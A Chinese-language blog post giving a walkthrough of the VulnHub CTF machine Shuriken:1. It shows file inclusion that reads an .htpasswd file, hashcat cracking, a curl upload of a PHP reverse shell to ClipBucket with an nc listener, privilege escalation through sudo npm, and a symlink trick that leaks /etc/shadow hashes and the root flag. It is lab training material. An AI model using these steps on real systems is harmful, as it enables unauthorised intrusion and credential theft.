> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/oB4JGP48xAx0TJBymU0K6g)

**0x01** Introduction  

* * *

虚拟机下载页面：http://www.vulnhub.com/entry/shuriken-1,600/  

Description

```
Difficulty: easy/medium

That's the first machine I developed. I tried to make use of more realistic techniques and then include them in a single machine. Keep in mind it's still just a CTF. It's meant to be rather easy. Can you take advantage of the misconfigurations made by The Shuriken Company? See you in the root.
```

‍

**0x02** **Writeup**  

* * *

2.1 getshell

#####  2.1.1 端口信息

只开放了 80 端口，只能从 web 应用入手

##### 2.1.2 脆弱服务

使用 dirb 爬取目录

目录扫描：  

```
==> DIRECTORY: http://192.168.56.121/css/                                      
==> DIRECTORY: http://192.168.56.121/img/                                      
+ http://192.168.56.121/index.php (CODE:200|SIZE:6021)                        
==> DIRECTORY: http://192.168.56.121/js/                                       
==> DIRECTORY: http://192.168.56.121/secret/  
```

#### 最初以为 secret 目录下 secret.png 图片做了信息隐藏，一顿操作没有找到任何信息。反过来查看 index.php 页面的 js，发现了有意思的东西。

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/zSNEpUdpZQSLsNuuMpN2ia0aANkv6Dibetl1HwQHsCV9UOpPp9z01ns9jxmSALA57wpEt7LBNI2TNJb9A9JpdSSg/640?wx_fmt=jpeg)

修改 hosts 后访问 http://broadcast.shuriken.local，发现需要 basic auth。

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/zSNEpUdpZQSLsNuuMpN2ia0aANkv6DibetZTt4JmCZed2KagP0lKJQ5Gda9JBGibCG0qZZ8vyZT0GXPgQQxqDaZSA/640?wx_fmt=jpeg)

尝试另一个请求 http://shuriken.local/index.php?referer=，读取到了 apache2 的默认配置文件 / etc/apache2/sites-enabled/000-default.conf。

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/zSNEpUdpZQSLsNuuMpN2ia0aANkv6DibettsArfv1qnIibfHChEr8Yh9xN0oYiaoVqPmxThJHVAnQwKkNicpicUDMiaJw/640?wx_fmt=jpeg)

继续读 / etc/apach2/.htpasswd，得到了用户名和加密密码 developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0。

用 hashcat 结合 rockyou 字典破解密码为 9972761drmfsls。

```
kali@kali:~$ hashcat -m 1600 -a 0 1.txt /usr/share/wordlists/rockyou.txt --show
$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0:9972761drmfsls
```

进入系统，发现是 clipbucket4.0。

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/zSNEpUdpZQSLsNuuMpN2ia0aANkv6Dibet4VeQD1ViactSvfXGvU57zIwpRWoUhW1ayeLZq2Xc2JWPf7fz6QUiaRJg/640?wx_fmt=jpeg)

在 exploit-db 上搜到一个利用：https://www.exploit-db.com/exploits/44250，成功上传 shell。

```
kali@kali:~$ curl --basic --user "developers:9972761drmfsls" -F "file=@php_reverse_shell.php" -F "plupload=1" -F "  http://broadcast.shuriken.local/actions/beats_uploader.php
{"success":"yes","file_name":"160691880796e48b","extension":"php","file_directory":"CB_BEATS_UPLOAD_DIR"}

kali@kali:~$ nc -lp 8080
Linux shuriken 5.4.0-47-generic #51~18.04.1-Ubuntu SMP Sat Sep 5 14:35:50 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 15:20:42 up  1:52,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     tty1     -                13:28   15:30   0.35s  0.35s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

##### 2.2 权限提权  

查看 sudo -l，发现可以执行 npm，这里利用 npm run 功能，成功切换到用户 server-management。

先生成一个 package.json，内容为：

```
{
  "scripts":{
    "dev": "/bin/bash"
  }
}
```

在相同目录下执行命令 sudo -u server-management npm run dev，得到第一个 flag。

```
$ cat package.json
{"scripts":{"dev":"/bin/bash"}}
$ sudo -u server-management npm run dev

> @ dev /tmp/test
> /bin/bash

id
uid=1000(server-management) gid=1000(server-management) groups=1000(server-management),24(cdrom),30(dip),46(plugdev),116(lpadmin),122(sambashare)

cd /home/server-management
cat user.txt
67528b07b382dfaa490f4dffc57dcdc0
```

上传运行 pspy64 发现了以下奇怪的进程:

```
2020/12/03 06:04:01 CMD: UID=0    PID=2772   | /bin/bash /var/opt/backupsrv.sh
```

查看 backupsrv.sh:

```
server-management@shuriken:/var/opt$ cat backupsrv.sh
cat backupsrv.sh
#!/bin/bash

# Where to backup to.
dest="/var/backups"

# What to backup. 
cd /home/server-management/Documents
backup_files="*"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

# Long listing of files in $dest to check file sizes.
ls -lh $dest
```

观察了一下，该 sh 大概每分钟会被执行一次，由于 sh 中参数不能修改，于是这里删除了 / home/server-management/Documents 文件夹，做了 / etc 到 Documents 的软连接，压缩成功后将其拷贝到 / var/www/main（注意：需切换到 www-data 用户），下载后获取到 shadow 文件。

```
# 软连接前
-rw-r--r--  1 root root     49331 Dec  3 06:20 shuriken-Thursday.tgz
server-management@shuriken:/var/backups$ rm ~/Documents -rf
server-management@shuriken:/var/backups$ ln -s /etc /home/server-management/Documents
# 软连接后
-rw-r--r--  1 root root   1124824 Dec  3 06:22 shuriken-Thursday.tgz
```

```
kali@kali:~/Downloads/test/shuriken-Thursday$ cat shadow
root:$6$KEYGm0ZQ$oTT3SYXna/5H61MZCwqvY995xtDqHGaMe5LRrMXNtVLLDVwfoj.DtJ0AQk6wfhAfOW23uR6wqd7UC5I7MPq0a0:18522:0:99999:7:::
daemon:*:18522:0:99999:7:::
bin:*:18522:0:99999:7:::
sys:*:18522:0:99999:7:::
sync:*:18522:0:99999:7:::
games:*:18522:0:99999:7:::
man:*:18522:0:99999:7:::
lp:*:18522:0:99999:7:::
mail:*:18522:0:99999:7:::
news:*:18522:0:99999:7:::
uucp:*:18522:0:99999:7:::
proxy:*:18522:0:99999:7:::
www-data:*:18522:0:99999:7:::
backup:*:18522:0:99999:7:::
list:*:18522:0:99999:7:::
irc:*:18522:0:99999:7:::
gnats:*:18522:0:99999:7:::
nobody:*:18522:0:99999:7:::
systemd-network:*:18522:0:99999:7:::
systemd-resolve:*:18522:0:99999:7:::
syslog:*:18522:0:99999:7:::
messagebus:*:18522:0:99999:7:::
_apt:*:18522:0:99999:7:::
uuidd:*:18522:0:99999:7:::
lightdm:*:18522:0:99999:7:::
whoopsie:*:18522:0:99999:7:::
kernoops:*:18522:0:99999:7:::
pulse:*:18522:0:99999:7:::
avahi:*:18522:0:99999:7:::
hplip:*:18522:0:99999:7:::
server-management:$6$.KeNqlcH$7vLzfrtf2GWWJ.32ZN0mMTJhHlYDE9PQsbrqkcgpnXDAv9hW27b1D/tC/XD1rsN29.DKFXVEqWgVtZxwvSTgE0:18522:0:99999:7:::
vboxadd:!:18522::::::
mysql:!:18522:0:99999:7:::
```

hashcat 一时没跑出来，算了，重复上面的步骤，将 / root 文件夹下下来，得到新的 flag。

```
kali@kali:~/Downloads/test$ cat root.txt 

d0f9655a4454ac54e3002265d40b2edd
                                          __                   
  ____  ____   ____    ________________ _/  |_  ______         
_/ ___\/  _ \ /    \  / ___\_  __ \__  \\   __\/  ___/         
\  \__(  <_> )   |  \/ /_/  >  | \// __ \|  |  \___ \          
 \___  >____/|___|  /\___  /|__|  (____  /__| /____  >         
     \/           \//_____/            \/          \/          
                                            __             .___
 ___.__. ____  __ __  _______  ____   _____/  |_  ____   __| _/
<   |  |/  _ \|  |  \ \_  __ \/  _ \ /  _ \   __\/ __ \ / __ | 
 \___  (  <_> )  |  /  |  | \(  <_> |  <_> )  | \  ___// /_/ | 
 / ____|\____/|____/   |__|   \____/ \____/|__|  \___  >____ | 
 \/                                                  \/     \/ 
  _________.__                 .__ __                          
 /   _____/|  |__  __ _________|__|  | __ ____   ____          
 \_____  \ |  |  \|  |  \_  __ \  |  |/ // __ \ /    \         
 /        \|   Y  \  |  /|  | \/  |    <\  ___/|   |  \        
/_______  /|___|  /____/ |__|  |__|__|_ \\___  >___|  /        
        \/      \/                     \/    \/     \/
```

**PS：**许多人企求着生活的完美结局，殊不知美根本不在结局，而在于追求的过程。

更多精彩

*   [Web 渗透技术初级课程介绍](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486030&idx=2&sn=185f303a2f1b5267c0865f117931959d&chksm=fcfc3718cb8bbe0e6f3ca97859e78342852537da2bef3cd76a83cb90ee64a8ca8953b35aa67e&scene=21#wechat_redirect)
    
*   [](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486968&idx=1&sn=7f66208298cf2cec57286947ddb8b223&chksm=fcfc30aecb8bb9b8333c1d05976dbdbf33d34f2a0d2b0cdfc41e835d29b9b4bcfc352504f8e4&scene=21#wechat_redirect)[vulnhub 之 Masashi:1 靶场 writeup](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247487124&idx=1&sn=cbb8a52c53719bb329ecef545015ba4e&chksm=fcfc33c2cb8bbad467efcc0f448fab1c788f74420f75ee7c985183358ee6eb8389ada70aed36&scene=21#wechat_redirect)
    
*   [系统漏扫软件 Nessus 之 pro 插件库](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247487142&idx=1&sn=592bc806cefdd8352e198ecf708b0061&chksm=fcfc33f0cb8bbae635657879e6c31dfb42b07ad21647040e83f70b899d1463e6bfab365cec50&scene=21#wechat_redirect)  
    
*   [商务合作](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486808&idx=1&sn=f50f15f9a3ab7312a08b1f932292faca&chksm=fcfc300ecb8bb918213c6070d864ffcd70ad27ab6525521c31e9ccaa57bdfa2968360ed7e8fe&scene=21#wechat_redirect)
    

![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQSd9wDlUiar0tUpHCYAzrZfTzOvS2SEw9cia9j7d1HKP2bWArPLCegs1XoejVUPu0GkSuZh7Wia7aExA/640?wx_fmt=png)

**如果感觉文章不错，分享让更多的人知道吧！**